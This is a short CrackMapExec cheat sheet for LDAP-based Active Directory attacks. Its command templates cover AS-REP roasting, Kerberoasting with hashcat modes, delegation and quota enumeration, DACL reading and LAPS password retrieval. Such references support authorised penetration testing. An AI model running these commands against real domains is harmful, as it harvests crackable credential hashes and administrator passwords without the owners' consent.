# cme

% cme-ldap, crackmapexec, windows, Active directory
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 


## ldap - LDAP connection
edit /etc/hosts
```bash
cme ldap <ip> -u <user> -p <password> -d <domain> --no-smb
```

## ldap - LDAP Machine Account Quota
```bash
cme ldap <ip> -u <user> -p <password> -d <domain> --no-smb -M MAQ
```

## ldap - ASREPRoast enum without authentication
User can be a wordlist too (user.txt)
Hashcat format  -m 18200 
```bash
cme ldap <ip> -u <user> -p '' --asreproast ASREProastables.txt --kdcHost <dc_name>
```

## ldap - ASREPRoast enum with authentication
Hashcat format  -m 18200 
```bash
cme ldap <ip> -u <user> -p '<password>' --asreproast ASREProastables.txt --kdcHost <dc_name>
```

## ldap - Kerberoasting
Hashcat format  -m 13100
```bash
cme ldap <ip> -u <user> -p '<password>' --kerberoasting kerberoastables.txt --kdcHost <dc_name>
```

## ldap - Unconstrained delegation
List of all computers et users with the flag TRUSTED_FOR_DELEGATION
```bash
cme ldap <ip> -u <user> -p '<password>' --trusted-for-delegation
```


## ldap - read DACLs of an account
```bash
cme ldap <dc_name> -k --kdcHost <dc_name> -M daclread -o TARGET=<user> ACTION=read
```


## ldap - read DACLs of an principal has over a target
```bash
cme ldap <dc_name> -k --kdcHost <dc_name> -M daclread -o TARGET=<target_user> -o PRINCIPAL=<user> ACTION=read
```

## ldap - read LAPS
```bash
cme ldap <dc_name> -k --kdcHost <dc_name>  -u <user> -p '<password>'  --module laps
```